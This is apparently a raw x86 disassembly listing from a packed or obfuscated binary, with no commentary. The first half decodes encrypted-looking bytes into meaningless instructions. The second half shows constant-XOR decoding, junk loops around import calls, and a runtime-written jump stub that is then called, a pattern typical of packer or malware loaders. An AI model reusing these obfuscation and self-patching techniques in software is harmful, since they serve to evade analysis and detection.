  409ac8:	xor    al,0xf2
  409aca:	xchg   esp,eax
  409acb:	test   eax,0xd169601a
  409ad0:	cmc    
  409ad1:	aam    0x12
  409ad3:	ficom  WORD PTR [eax+eax*8]
  409ad6:	xor    al,al
  409ad8:	imul   ecx,eax,0x7c
  409adb:	inc    DWORD PTR [ebp+0x33b33189]
  409ae1:	stos   DWORD PTR es:[edi],eax
  409ae2:	nop
  409ae3:	scas   al,BYTE PTR es:[edi]
  409ae4:	retf   
  409ae5:	sbb    bl,BYTE PTR [ebx]
  409ae7:	ds cmp eax,0x9c017f91
  409aed:	inc    edx
  409aee:	pop    ebp
  409aef:	leave  
  409af0:	or     eax,0x4ab2ae55
  409af5:	xchg   esi,eax
  409af6:	(bad)  
  409af7:	jle    0x409b1e
  409af9:	mov    ch,0x3d
  409afb:	fidivr DWORD PTR ds:[esi]
  409afe:	pushf  
  409aff:	adc    al,0x95
  409b01:	es dec ebx
  409b03:	(bad)  [ebp+edx*2-0xd]
  409b07:	cli    
  409b08:	sti    
  409b09:	das    
  409b0a:	fcom   st(7)
  409b0c:	jmp    0xa9794943
  409b11:	mov    cs,esp
  409b13:	data16 ja 0x409b45
  409b16:	or     ch,BYTE PTR [edi+0x7a]
  409b19:	std    
  409b1a:	imul   esi,DWORD PTR [ecx+0x7e8b005],0x3f061d4f
  409b24:	loopne 0x409ab2
  409b26:	pop    esi
  409b27:	cs stc 
  409b29:	stos   BYTE PTR es:[edi],al
  409b2a:	retf   
  409b2b:	sbb    esi,DWORD PTR [ecx+0x4469dbfd]
  409b31:	test   DWORD PTR ds:0xa6e77696,esp
  409b37:	neg    DWORD PTR [ebx-0x49]
  409b3a:	add    eax,0x1a1d0e4d
  409b3f:	retf   
  409b40:	lock iret 
  409b42:	mov    ecx,0xc50c3199
  409b47:	cwde   
  409b48:	or     esp,ecx
  409b4a:	mov    eax,ds:0x6282c875
  409b4f:	aad    0xc1
  409b51:	dec    eax
  409b52:	and    BYTE PTR ds:0xd3fabbdd,bl
  409b58:	pop    ebx
  409b59:	outs   dx,BYTE PTR ds:[esi]
  409b5a:	xor    ecx,DWORD PTR [ecx-0x3a]
  409b5d:	pusha  
  409b5e:	xchg   esp,eax
  409b5f:	fdivp  st(0),st
  409b61:	xchg   edx,eax
  409b62:	pusha  
  409b63:	dec    ebp
  409b64:	mov    cl,0xb6
  409b66:	xlat   BYTE PTR ds:[ebx]
  409b67:	add    eax,0xbe9c1f47
  409b6c:	mov    ds:0x7812468c,eax
  409b71:	jo     0x409bea
  409b73:	mov    ebx,0x3514344f
  409b78:	fsubr  QWORD PTR [ebp+0x7c]
  409b7b:	ins    BYTE PTR es:[edi],dx
  409b7c:	pusha  
  409b7d:	ins    BYTE PTR es:[edi],dx
  409b7e:	jnp    0x409b0e
  409b80:	add    al,0x9d
  409b82:	jmp    0x409bc4
  409b84:	cs popf 
  409b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b87:	ds aam 0xd6
  409b8a:	push   esi
  409b8b:	xchg   edx,eax
  409b8c:	add    cl,BYTE PTR [edi]
  409b8e:	nop
  409b8f:	or     al,0xcc
  409b91:	jbe    0x409c0f
  409b93:	ret    
  409b94:	aas    
  409b95:	pop    esi
  409b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b97:	lds    edx,FWORD PTR [edi-0x14fa82a0]
  409b9d:	cmp    DWORD PTR [ebx-0x38],0xccda54de
  409ba4:	sub    eax,0x42aa8b54
  409ba9:	js     0x409bba
  409bab:	mov    dl,0xf3
  409bad:	pop    ebp
  409bae:	ja     0x409b7a
  409bb0:	sub    BYTE PTR [edx-0x5a],dl
  409bb3:	or     al,ch
  409bb5:	pop    eax
  409bb6:	popa   
  409bb7:	adc    DWORD PTR [eax],eax
  409bb9:	jnp    0x409c03
  409bbb:	ret    0x53fe
  409bbe:	mov    WORD PTR [esi-0x7f],cs
  409bc1:	xor    DWORD PTR [edx+esi*8],0xf495020f
  409bc8:	out    dx,eax
  409bc9:	iret   
  409bca:	or     eax,0x3e1c308c
  409bcf:	jge    0x409ba9
  409bd1:	arpl   WORD PTR ds:0x2a34e3c,cx
  409bd7:	test   BYTE PTR [esp+eax*1+0x5c],bh
  409bdb:	sti    
  409bdc:	fisttp DWORD PTR [eax+eiz*8+0x37]
  409be0:	cdq    
  409be1:	pop    esi
  409be2:	sbb    BYTE PTR [edi-0x58c45737],ch
  409be8:	ret    0xaa35
  409beb:	call   0x325f:0x92b7b1c8
  409bf2:	jb     0x409bd3
  409bf4:	pushf  
  409bf5:	inc    eax
  409bf6:	dec    eax
  409bf7:	inc    esp
  409bf8:	rol    DWORD PTR [edx+0x2],cl
  409bfb:	lea    edx,[ebx]
  409bfd:	or     edx,eax
  409bff:	mov    ebx,0x6bcb0175
  409c04:	mov    cl,0xc5
  409c06:	aas    
  409c07:	adc    al,0xdd
  409c09:	dec    esp
  409c0a:	mov    eax,0xc5a4e174
  409c0f:	jecxz  0x409c44
  409c11:	mov    eax,0xe9fce50b
  409c16:	jecxz  0x409c46
  409c18:	outs   dx,DWORD PTR ds:[esi]
  409c19:	dec    ebp
  409c1a:	push   edx
  409c1b:	test   al,0xc1
  409c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c1e:	lds    ebx,FWORD PTR ss:[ebp+0x6e]
  409c22:	es addr16 pop esi
  409c25:	xor    ecx,DWORD PTR [edi+0x28cc7488]
  409c2b:	mov    al,0x27
  409c2d:	pop    ds
  409c2e:	repz rol ecx,cl
  409c31:	ins    BYTE PTR es:[edi],dx
  409c32:	repnz pop ebp
  409c34:	(bad)
  409c38:	and    BYTE PTR [edi-0x1b09112a],bh
  409c3e:	(bad)  
  409c3f:	idiv   ah
  409c41:	add    DWORD PTR [esi+0x63a47d76],0xcc077e90
  409c4b:	sub    al,bh
  409c4d:	jbe    0x409c55
  409c4f:	mov    eax,0x4bff683
  409c54:	retf   0x15f7
  409c57:	mov    DWORD PTR [edi],eax
  409c59:	and    esp,DWORD PTR ds:0x9dacef9
  409c5f:	jle    0x409c1e
  409c61:	aam    0x59
  409c63:	cdq    
  409c64:	jp     0x409cc9
  409c66:	test   eax,0xc5e2a9a3
  409c6b:	(bad)  
  409c6c:	cli    
  409c6d:	ja     0x409ce2
  409c6f:	cmp    DWORD PTR [esi+0xf],ecx
  409c72:	stos   BYTE PTR es:[edi],al
  409c73:	outs   dx,BYTE PTR ds:[esi]
  409c74:	xor    DWORD PTR [ebp-0x2b],esp
  409c77:	push   edx
  409c78:	pop    ds
  409c79:	ret    0x6b8b
  409c7c:	pop    edx
  409c7d:	call   0xfc09:0x83e6e114
  409c84:	sub    DWORD PTR [ebx+0x78],esi
  409c87:	jge    0x409c0b
  409c89:	xchg   ecx,eax
  409c8a:	adc    bh,bh
  409c8c:	pop    esi
  409c8d:	nop
  409c8e:	cmp    bl,BYTE PTR [edx-0x7307f087]
  409c94:	push   0xfeb2458b
  409c99:	popf   
  409c9a:	mov    dh,BYTE PTR [ebx+0xc83e0dc]
  409ca0:	(bad)  
  409ca2:	mov    fs,WORD PTR [edx+0x4f]
  409ca5:	mov    ecx,0xd015773a
  409caa:	je     0x409c7f
  409cac:	lahf   
  409cad:	cmp    eax,0xb386814b
  409cb2:	mov    BYTE PTR [ebx+0x7],cl
  409cb5:	dec    ebx
  409cb6:	in     eax,dx
  409cb7:	out    0x45,al
  409cb9:	push   0x9e98cabd
  409cbe:	jb     0x409d38
  409cc0:	xchg   edx,eax
  409cc1:	rcr    BYTE PTR [edx],0x12
  409cc4:	popa   
  409cc5:	into   
  409cc6:	inc    ecx
  409cc7:	gs sub eax,0x1fde7432
  409ccd:	jbe    0x409cae
  409ccf:	inc    ebp
  409cd0:	popa   
  409cd1:	push   edx
  409cd2:	iret   
  409cd3:	psllq  mm7,QWORD PTR [ebp+0x3f]
  409cd7:	fstp   TBYTE PTR [ecx+0x727b1963]
  409cdd:	aaa    
  409cde:	push   es
  409cdf:	jbe    0x409ce0
  409ce1:	(bad)  
  409ce2:	mov    ecx,0x40aa7f16
  409ce7:	mov    eax,ds:0xc928a569
  409cec:	pop    esi
  409cee:	mov    esi,0x4207e27b
  409cf3:	cmp    DWORD PTR [edi],0xffffffb9
  409cf6:	xchg   ecx,eax
  409cf7:	vpcomleb xmm9,xmm4,XMMWORD PTR [esi+ecx*4+0x247f29c7]
  409d02:	in     eax,dx
  409d03:	pop    esp
  409d04:	ror    BYTE PTR [ecx],1
  409d06:	jecxz  0x409ce8
  409d08:	addr16 jb 0x409d5d
  409d0b:	push   eax
  409d0c:	push   cs
  409d0d:	aas    
  409d0e:	cld    
  409d0f:	jecxz  0x409d5d
  409d11:	mov    ebx,0xe0a3d676
  409d16:	xor    BYTE PTR [edx-0x31],0x8d
  409d1a:	inc    edi
  409d1b:	ret    0x2566
  409d1e:	push   edx
  409d1f:	jmp    0x64823b6c
  409d24:	inc    ecx
  409d25:	inc    ecx
  409d26:	add    eax,0xac0bf4e5
  409d2b:	ror    DWORD PTR [edi+0x1c],1
  409d2e:	loopne 0x409d8a
  409d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d31:	add    eax,0x97fad0b3
  409d36:	xchg   ebp,eax
  409d37:	xchg   edi,eax
  409d38:	or     edx,DWORD PTR [ebp-0x3152c26e]
  409d3e:	push   ds
  409d3f:	das    
  409d40:	sbb    ebp,DWORD PTR [esi+0x4f70562f]
  409d46:	mov    al,0x1c
  409d48:	add    BYTE PTR [esp+edi*2],dl
  409d4b:	pop    ss
  409d4c:	pop    esp
  409d4d:	cmp    DWORD PTR [edx+ecx*2],edx
  409d50:	in     eax,dx
  409d51:	dec    ebp
  409d52:	repz retf 0x2612
  409d56:	jp     0x409d0c
  409d58:	add    BYTE PTR [esi+0x25a2c0d1],cl
  409d5e:	dec    edx
  409d5f:	mov    BYTE PTR [esi+0x63],0xac
  409d63:	iret   
  409d64:	inc    edx
  409d65:	cmp    BYTE PTR [eax+0x45],bh
  409d68:	ficomp DWORD PTR [ecx]
  409d6a:	fsubr  st,st(1)
  409d6c:	cld    
  409d6d:	push   ecx
  409d6e:	int    0x53
  409d70:	fdivrp st(7),st
  409d72:	ds clc 
  409d74:	cmp    BYTE PTR [ebx-0x207b7cca],dh
  409d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d7b:	mov    edi,0xe97bb4cc
  409d80:	ja     0x409d05
  409d82:	leave  
  409d83:	cli    
  409d84:	xor    eax,0x53170eae
  409d89:	aad    0xe2
  409d8b:	hlt    
  409d8c:	cwde   
  409d8d:	mov    ch,0xc4
  409d8f:	push   0xffffffd5
  409d91:	loop   0x409d4f
  409d93:	je     0x409d65
  409d95:	pop    esi
  409d96:	ficomp WORD PTR [edx-0x30]
  409d99:	neg    DWORD PTR [esi+0x42]
  409d9c:	scas   al,BYTE PTR es:[edi]
  409d9d:	data16 stos BYTE PTR es:[edi],al
  409d9f:	fs mov esi,0x3974670d
  409da5:	js     0x409ded
  409da7:	imul   ebx,DWORD PTR [ecx+ecx*1],0xaad66468
  409dae:	jbe    0x409d9e
  409db0:	pop    ebx
  409db1:	in     al,0x54
  409db3:	adc    BYTE PTR [eax-0x71bab64],dl
  409db9:	addr16 pop ecx
  409dbb:	cmp    ch,BYTE PTR [ebp+0x53]
  409dbe:	sbb    BYTE PTR ds:0xd432b313,ah
  409dc4:	jge    0x409e40
  409dc6:	in     eax,dx
  409dc7:	pushf  
  409dc8:	mov    edi,0x795858be
  409dcd:	enter  0xa2bc,0x89
  409dd1:	cmp    eax,0x623bc24d
  409dd6:	(bad)  
  409dd7:	daa    
  409dd8:	in     eax,dx
  409dd9:	out    dx,al
  409dda:	not    BYTE PTR [ecx-0x43]
  409ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dde:	inc    esp
  409ddf:	xor    eax,0xe1057813
  409de4:	xor    BYTE PTR [ecx+0x1d],dl
  409de7:	outs   dx,DWORD PTR ds:[esi]
  409de8:	enter  0xafe6,0x8a
  409dec:	and    ch,BYTE PTR [edx+0x43]
  409def:	push   es
  409df0:	leave  
  409df1:	retf   0x769a
  409df4:	dec    ebp
  409df5:	add    ebx,DWORD PTR [edi]
  409df7:	popa   
  409df8:	mov    ebp,0xb3f5c1bf
  409dfd:	push   esi
  409dfe:	fs cmp eax,0x803accf8
  409e04:	pop    ds
  409e05:	pop    eax
  409e06:	mov    bl,0x3b
  409e08:	mov    DWORD PTR [esp+ecx*4-0x40],ebp
  409e0c:	sbb    BYTE PTR [ebp+eax*4-0x4e225cc0],bl
  409e13:	fldcw  WORD PTR [ebx+0x2222a29]
  409e19:	loope  0x409dc6
  409e1b:	not    BYTE PTR [esi+ebx*8-0x77aaaace]
  409e22:	and    DWORD PTR [edi+0x797e64c7],edx
  409e28:	pushf  
  409e29:	les    esp,FWORD PTR [ecx+0x6d]
  409e2c:	mov    ds:0xd85ca549,al
  409e31:	loope  0x409df7
  409e33:	mov    cl,0x6b
  409e35:	lds    edi,FWORD PTR [esi+0x6d996163]
  409e3b:	pop    ecx
  409e3c:	sbb    esi,DWORD PTR [ecx+0x4c363ce2]
  409e42:	xor    esp,ebp
  409e44:	dec    ebx
  409e45:	into   
  409e46:	loopne 0x409dd5
  409e48:	add    al,0x5
  409e4a:	jmp    DWORD PTR [eax+0x29ea8007]
  409e50:	jnp    0x409df7
  409e52:	mov    ch,0x5d
  409e54:	ret    0xb7a3
  409e57:	arpl   WORD PTR [ebp+0x7b946444],ax
  409e5d:	pop    ecx
  409e5e:	arpl   WORD PTR ds:0xaabdf87e,cx
  409e64:	jl     0x409e44
  409e66:	outs   dx,BYTE PTR ds:[esi]
  409e67:	test   al,0x91
  409e69:	xchg   ecx,eax
  409e6a:	retf   0xbbf2
  409e6d:	and    eax,0xaf0fd217
  409e72:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  409e78:	mov    ecx,DWORD PTR [ebp+0x8]
  409e7b:	lea    ecx,[edx+ecx*1+0x3272dd]
  409e82:	cmp    ecx,eax
  409e84:	je     0x409efb
  409e8a:	mov    edi,DWORD PTR [ebp-0x14]
  409e8d:	mov    eax,DWORD PTR [ebp+0x8]
  409e90:	mov    edx,DWORD PTR [ebp+0x14]
  409e93:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  409e97:	mov    ecx,0x7510896
  409e9c:	xor    edx,edx
  409e9e:	xor    edi,ecx
  409ea0:	mov    esi,0x3272dd
  409ea5:	add    edi,esi
  409ea7:	div    edi
  409ea9:	mov    edx,DWORD PTR [ebp-0x4]
  409eac:	xor    edx,ecx
  409eae:	lea    eax,[edx+eax*1+0x3272dd]
  409eb5:	mov    edx,DWORD PTR [ebp+0x8]
  409eb8:	mov    edi,DWORD PTR [ebp-0x20]
  409ebb:	mov    DWORD PTR [edi+edx*4],eax
  409ebe:	mov    eax,DWORD PTR [ebp-0x14]
  409ec1:	mov    edx,DWORD PTR [ebp+0x8]
  409ec4:	xor    eax,ecx
  409ec6:	lea    eax,[eax+edx*1+0x3272dd]
  409ecd:	mov    DWORD PTR [ebp+0x8],eax
  409ed0:	mov    eax,DWORD PTR [ebp-0x14]
  409ed3:	mov    edx,DWORD PTR [ebp+0x14]
  409ed6:	xor    eax,ecx
  409ed8:	add    eax,esi
  409eda:	imul   eax,DWORD PTR [edx]
  409edd:	mov    edx,DWORD PTR [ebp-0x4]
  409ee0:	xor    edx,ecx
  409ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  409ee5:	lea    ecx,[edx+ecx*1+0x3272dd]
  409eec:	cmp    ecx,eax
  409eee:	jne    0x409e8a
  409ef4:	mov    eax,esi
  409ef6:	jmp    0x409f00
  409efb:	mov    eax,0x3272dd
  409f00:	mov    ebx,0x7510896
  409f05:	mov    ecx,DWORD PTR [ebp-0x4]
  409f08:	xor    ecx,ebx
  409f0a:	add    ecx,eax
  409f0c:	mov    DWORD PTR [ebp-0xc],ecx
  409f0f:	mov    ebx,0x65655
  409f14:	add    ebx,0x3234
  409f1a:	xchg   ebx,esi
  409f1c:	xor    ebx,ebx
  409f1e:	push   esi
  409f1f:	mov    esi,ebx
  409f21:	pop    ebx
  409f22:	mov    edx,esi
  409f24:	add    ebx,0x1002
  409f2a:	lea    eax,[ebp-0x10]
  409f2d:	add    edx,eax
  409f2f:	add    edx,0x5
  409f32:	push   edx
  409f33:	inc    esi
  409f34:	pop    ecx
  409f35:	dec    ecx
  409f36:	xchg   ecx,eax
  409f37:	dec    eax
  409f38:	xchg   ecx,eax
  409f39:	dec    ecx
  409f3a:	xchg   ecx,edx
  409f3c:	dec    edx
  409f3d:	push   edx
  409f3e:	mov    edx,ebx
  409f40:	pop    ebx
  409f41:	dec    ebx
  409f42:	call   DWORD PTR [ebx]
  409f44:	cmp    DWORD PTR [ebp+0x10],esi
  409f47:	je     0x409f66
  409f4d:	xchg   edx,eax
  409f4e:	push   0xb
  409f50:	pop    ecx
  409f51:	push   0x4
  409f53:	pop    ebx
  409f54:	inc    ebx
  409f55:	xchg   ebx,ecx
  409f57:	sub    ebx,ecx
  409f59:	xchg   ebx,ecx
  409f5b:	dec    ecx
  409f5c:	dec    ecx
  409f5d:	mov    eax,DWORD PTR [ebp-0x1c]
  409f60:	imul   eax,ecx
  409f63:	add    esp,eax
  409f65:	xchg   edx,eax
  409f66:	push   eax
  409f67:	xor    ebx,ebx
  409f69:	mov    edx,esp
  409f6b:	dec    edx
  409f6c:	inc    ebx
  409f6d:	add    ebx,DWORD PTR [edx+ebx*1]
  409f70:	dec    ebx
  409f71:	xor    edx,edx
  409f73:	add    DWORD PTR [ebp-0xc],ebx
  409f76:	pop    ebx
  409f77:	mov    eax,DWORD PTR [ebp-0xc]
  409f7a:	pop    edi
  409f7b:	pop    esi
  409f7c:	pop    ebx
  409f7d:	leave  
  409f7e:	ret    0x10
  409f81:	push   ebp
  409f82:	mov    ebp,esp
  409f84:	sub    esp,0x7c
  409f87:	xor    ecx,ecx
  409f89:	xor    ecx,DWORD PTR ds:0x42c014
  409f8f:	xor    DWORD PTR ds:0x42d018,ecx
  409f95:	push   esi
  409f96:	push   edi
  409f97:	movzx  edi,WORD PTR ds:0x429014
  409f9e:	adc    edi,DWORD PTR ds:0x42c018
  409fa4:	mov    DWORD PTR ds:0x429014,edi
  409faa:	mov    eax,ds:0x42e435
  409faf:	or     ecx,0x9a5
  409fb5:	mov    DWORD PTR [ebp-0x24],eax
  409fb8:	mov    eax,ds:0x42e541
  409fbd:	mov    DWORD PTR [ebp-0x34],eax
  409fc0:	or     edi,eax
  409fc2:	and    DWORD PTR [ebp-0x30],0x0
  409fc6:	xor    DWORD PTR ds:0x429018,0x17b1
  409fd0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  409fd7:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  409fde:	mov    eax,DWORD PTR [ebp-0x10]
  409fe1:	mov    ecx,DWORD PTR [ebp-0x10]
  409fe4:	sub    eax,ecx
  409fe6:	mov    DWORD PTR [ebp-0x10],eax
  409fe9:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  409ff0:	and    DWORD PTR ds:0x42901c,0x0
  409ffa:	xor    eax,eax
  409ffc:	or     eax,DWORD PTR ds:0x42901c
  40a002:	inc    eax
  40a003:	mov    ds:0x42901c,eax
  40a008:	cmp    DWORD PTR ds:0x42901c,0xb
  40a00f:	jne    0x40a029
  40a015:	push   0x42e14e
  40a01a:	push   DWORD PTR [ebp-0xc]
  40a01d:	push   DWORD PTR [ebp-0x18]
  40a020:	push   DWORD PTR [ebp-0x24]
  40a023:	call   DWORD PTR ds:0x42ed61
  40a029:	cmp    DWORD PTR ds:0x42901c,0xa
  40a030:	jne    0x40a041
  40a036:	mov    eax,ds:0x42901c
  40a03b:	inc    eax
  40a03c:	mov    ds:0x42901c,eax
  40a041:	cmp    DWORD PTR ds:0x42901c,0x13
  40a048:	jb     0x409ffa
  40a04e:	sub    eax,esi
  40a050:	mov    eax,DWORD PTR [ebp-0x18]
  40a053:	mov    ecx,DWORD PTR [ebp-0x18]
  40a056:	sub    eax,ecx
  40a058:	mov    DWORD PTR [ebp-0x18],eax
  40a05b:	and    DWORD PTR ds:0x429000,0x0
  40a065:	mov    edi,DWORD PTR ds:0x429000
  40a06b:	inc    edi
  40a06c:	mov    DWORD PTR ds:0x429000,edi
  40a072:	cmp    DWORD PTR ds:0x429000,0xe
  40a079:	jne    0x40a08f
  40a07f:	push   0x429000
  40a084:	push   0x4a29
  40a089:	call   DWORD PTR ds:0x42ed65
  40a08f:	cmp    DWORD PTR ds:0x429000,0xd
  40a096:	jne    0x40a0ab
  40a09c:	xor    edi,edi
  40a09e:	or     edi,DWORD PTR ds:0x429000
  40a0a4:	inc    edi
  40a0a5:	mov    DWORD PTR ds:0x429000,edi
  40a0ab:	cmp    DWORD PTR ds:0x429000,0x1e
  40a0b2:	jb     0x40a065
  40a0b8:	and    eax,0x2f3f
  40a0bd:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  40a0c4:	mov    eax,DWORD PTR [ebp-0xc]
  40a0c7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a0ca:	or     edi,esi
  40a0cc:	sub    eax,ecx
  40a0ce:	xor    edi,edi
  40a0d0:	xor    edi,DWORD PTR ds:0x42d004
  40a0d6:	and    DWORD PTR ds:0x429008,edi
  40a0dc:	mov    DWORD PTR [ebp-0xc],eax
  40a0df:	sbb    DWORD PTR ds:0x42a018,0x66a3
  40a0e9:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40a0f0:	adc    DWORD PTR ds:0x42b010,ecx
  40a0f6:	mov    eax,DWORD PTR [ebp-0x1c]
  40a0f9:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a0fc:	xor    esi,esi
  40a0fe:	xor    esi,DWORD PTR ds:0x411fec
  40a104:	mov    edi,DWORD PTR ds:0x411ff8
  40a10a:	sub    edi,esi
  40a10c:	and    esi,DWORD PTR [esi+edi*1]
  40a10f:	sub    eax,ecx
  40a111:	and    DWORD PTR ds:0x42c008,0x0
  40a11b:	mov    ecx,DWORD PTR ds:0x42c008
  40a121:	inc    ecx
  40a122:	mov    DWORD PTR ds:0x42c008,ecx
  40a128:	cmp    DWORD PTR ds:0x42c008,0x16
  40a12f:	jne    0x40a159
  40a135:	push   0x2fca
  40a13a:	push   0x42c014
  40a13f:	push   0x8b86
  40a144:	push   0x42e0af
  40a149:	push   0x5b55
  40a14e:	push   0x1406
  40a153:	call   DWORD PTR ds:0x42ed6d
  40a159:	cmp    DWORD PTR ds:0x42c008,0x10
  40a160:	jb     0x40a11b
  40a166:	add    DWORD PTR ds:0x42a018,ecx
  40a16c:	mov    DWORD PTR [ebp-0x1c],eax
  40a16f:	adc    DWORD PTR ds:0x42d018,ebx
  40a175:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40a17c:	mov    eax,DWORD PTR [ebp-0x20]
  40a17f:	mov    ecx,DWORD PTR [ebp-0x20]
  40a182:	mov    DWORD PTR ds:0x42c014,0x17
  40a18c:	cmp    DWORD PTR ds:0x42c014,0x0
  40a193:	je     0x40a1be
  40a199:	cmp    DWORD PTR ds:0x42c014,0x22
  40a1a0:	jne    0x40a1ac
  40a1a6:	call   DWORD PTR ds:0x42ed71
  40a1ac:	mov    esi,DWORD PTR ds:0x42c014
  40a1b2:	dec    esi
  40a1b3:	mov    DWORD PTR ds:0x42c014,esi
  40a1b9:	jmp    0x40a18c
  40a1be:	sub    eax,ecx
  40a1c0:	and    DWORD PTR ds:0x42a004,0x0
  40a1ca:	jmp    0x40a1dc
  40a1cf:	mov    edi,DWORD PTR ds:0x42a004
  40a1d5:	inc    edi
  40a1d6:	mov    DWORD PTR ds:0x42a004,edi
  40a1dc:	cmp    DWORD PTR ds:0x42a004,0x15
  40a1e3:	jae    0x40a220
  40a1e9:	cmp    DWORD PTR ds:0x42a004,0x6
  40a1f0:	jne    0x40a201
  40a1f6:	push   0x42c008
  40a1fb:	call   DWORD PTR ds:0x42ed75
  40a201:	cmp    DWORD PTR ds:0x42a004,0x5
  40a208:	jne    0x40a21b
  40a20e:	mov    edi,DWORD PTR ds:0x42a004
  40a214:	inc    edi
  40a215:	mov    DWORD PTR ds:0x42a004,edi
  40a21b:	jmp    0x40a1cf
  40a220:	mov    DWORD PTR [ebp-0x20],eax
  40a223:	mov    eax,DWORD PTR [ebp-0x2c]
  40a226:	mov    ecx,DWORD PTR [ebp-0x20]
  40a229:	mov    esi,0x7510896
  40a22e:	xor    eax,esi
  40a230:	mov    edi,0x3272dd
  40a235:	add    eax,edi
  40a237:	or     eax,ecx
  40a239:	mov    DWORD PTR [ebp-0x20],eax
  40a23c:	mov    eax,DWORD PTR [ebp-0x4]
  40a23f:	mov    ecx,DWORD PTR [ebp-0x4]
  40a242:	sub    eax,ecx
  40a244:	mov    DWORD PTR [ebp-0x4],eax
  40a247:	or     DWORD PTR [ebp-0x4],0xf89c85be
  40a24e:	mov    eax,DWORD PTR [ebp-0xc]
  40a251:	xor    eax,esi
  40a253:	add    eax,edi
  40a255:	push   eax
  40a256:	mov    eax,DWORD PTR [ebp-0x10]
  40a259:	xor    eax,esi
  40a25b:	add    eax,edi
  40a25d:	push   eax
  40a25e:	mov    eax,DWORD PTR [ebp-0x4]
  40a261:	xor    eax,esi
  40a263:	add    eax,edi
  40a265:	push   eax
  40a266:	lea    eax,[ebp-0x7c]
  40a269:	push   eax
  40a26a:	push   DWORD PTR [ebp-0x2c]
  40a26d:	push   DWORD PTR [ebp-0x28]
  40a270:	call   0x40f163
  40a275:	test   eax,eax
  40a277:	je     0x40a2a5
  40a27d:	lea    eax,[ebp-0x7c]
  40a280:	push   eax
  40a281:	mov    eax,DWORD PTR [ebp-0x28]
  40a284:	xor    eax,esi
  40a286:	add    eax,edi
  40a288:	push   eax
  40a289:	mov    eax,DWORD PTR [ebp-0x24]
  40a28c:	add    eax,0xaa
  40a291:	push   eax
  40a292:	mov    eax,DWORD PTR [ebp-0x24]
  40a295:	mov    eax,DWORD PTR [eax+0x198]
  40a29b:	push   DWORD PTR [eax]
  40a29d:	call   0x40508b
  40a2a2:	mov    DWORD PTR [ebp-0x14],eax
  40a2a5:	lea    eax,[ebp+0x4]
  40a2a8:	mov    DWORD PTR [ebp-0x30],eax
  40a2ab:	mov    eax,DWORD PTR [ebp-0x14]
  40a2ae:	test   eax,eax
  40a2b0:	je     0x40a318
  40a2b6:	lea    eax,[ebp-0x8]
  40a2b9:	mov    DWORD PTR [ebp-0x38],eax
  40a2bc:	mov    eax,DWORD PTR [ebp-0x34]
  40a2bf:	mov    DWORD PTR [ebp-0x8],eax
  40a2c2:	mov    eax,DWORD PTR [ebp-0x8]
  40a2c5:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2c8:	sub    eax,ecx
  40a2ca:	mov    DWORD PTR [ebp-0x8],eax
  40a2cd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2d0:	xor    ecx,esi
  40a2d2:	mov    eax,0xffcd8d23
  40a2d7:	sub    eax,ecx
  40a2d9:	add    DWORD PTR [ebp-0x8],eax
  40a2dc:	mov    eax,DWORD PTR [ebp-0x8]
  40a2df:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2e2:	mov    DWORD PTR [ecx+0x1],eax
  40a2e5:	mov    eax,DWORD PTR [ebp-0x14]
  40a2e8:	push   DWORD PTR [ebp-0x24]
  40a2eb:	mov    BYTE PTR [eax],0xe9
  40a2ee:	mov    eax,ds:0x42e2b1
  40a2f3:	push   DWORD PTR [eax]
  40a2f5:	push   DWORD PTR ds:0x42e50d
  40a2fb:	push   DWORD PTR ds:0x42e2b9
  40a301:	push   DWORD PTR ds:0x42e4ed
  40a307:	push   DWORD PTR ds:0x42eafd
  40a30d:	push   DWORD PTR [ebp-0x28]
  40a310:	push   DWORD PTR [ebp-0x2c]
  40a313:	mov    eax,DWORD PTR [ebp-0x14]
  40a316:	call   eax
  40a318:	mov    eax,DWORD PTR [ebp-0x30]
  40a31b:	mov    ecx,DWORD PTR ds:0x42e4b1
  40a321:	add    DWORD PTR [eax],ecx
  40a323:	pop    edi
  40a324:	pop    esi
  40a325:	leave  
  40a326:	ret    
  40a327:	push   ebp
  40a328:	mov    ebp,esp
  40a32a:	sub    esp,0x18
  40a32d:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  40a334:	lea    eax,[ebp+0x14]
  40a337:	mov    DWORD PTR [ebp-0x4],eax
  40a33a:	add    edx,0x781f
  40a340:	push   esi
  40a341:	and    esi,esi
  40a343:	mov    esi,0xf89c85b5
  40a348:	mov    DWORD PTR [ebp-0xc],esi
  40a34b:	lea    eax,[ebp-0xc]
  40a34e:	mov    DWORD PTR [ebp-0x14],eax
  40a351:	mov    eax,DWORD PTR [ebp-0xc]
  40a354:	mov    edx,DWORD PTR [ebp-0x14]
  40a357:	mov    ecx,0x7510896
  40a35c:	and    DWORD PTR ds:0x42d010,0x34d
  40a366:	xor    eax,ecx
  40a368:	sub    DWORD PTR ds:0x42a00c,0x429018
  40a372:	add    eax,0x3272dd
  40a377:	adc    DWORD PTR ds:0x42d00c,0x760b
  40a381:	mov    DWORD PTR [edx],eax
  40a383:	dec    edx
  40a384:	mov    eax,ds:0x42e2ad
  40a389:	sub    DWORD PTR ds:0x429008,ecx
  40a38f:	mov    edx,DWORD PTR [ebp-0x4]
  40a392:	mov    eax,DWORD PTR [eax]
  40a394:	and    DWORD PTR ds:0x42d004,0x42a01c
  40a39e:	add    eax,DWORD PTR [edx]
  40a3a0:	push   edi
  40a3a1:	mov    DWORD PTR [ebp-0x8],eax
  40a3a4:	and    DWORD PTR ds:0x42c008,0x0
